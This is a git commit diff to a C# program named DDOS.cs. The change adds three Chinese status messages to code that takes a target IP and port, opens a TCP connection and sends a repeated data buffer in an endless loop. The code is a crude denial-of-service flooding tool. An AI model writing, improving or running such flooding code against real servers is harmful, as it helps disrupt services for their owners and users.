0804706f51d0b87e82e4d21b5899ac983348e748
YourFunnyBrother <140477055+YourFunnyBrother@users.noreply.github.com>
2023-12-31 11:00:12 +0800

    Update DDOS.cs

--- DDOS.cs
+++ DDOS.cs
@@ -8,9 +8,12 @@ class Program {
         string serverIP = Console.ReadLine();
         Console.Write("端口: ");
         int serverPort = Int32.Parse(Console.ReadLine());
+        Console.WriteLine("服务器地址读取成功...");
         TcpClient client = new TcpClient();
         client.Connect(serverIP, serverPort);
+        Console.WriteLine("服务器连接成功...");
         NetworkStream stream = client.GetStream();
+        Console.WriteLine("正在准备...");
         byte[] buffer = System.Text.Encoding.ASCII.GetBytes("DataDataDataDataDataData");
         int count = 0;
         while(true) {
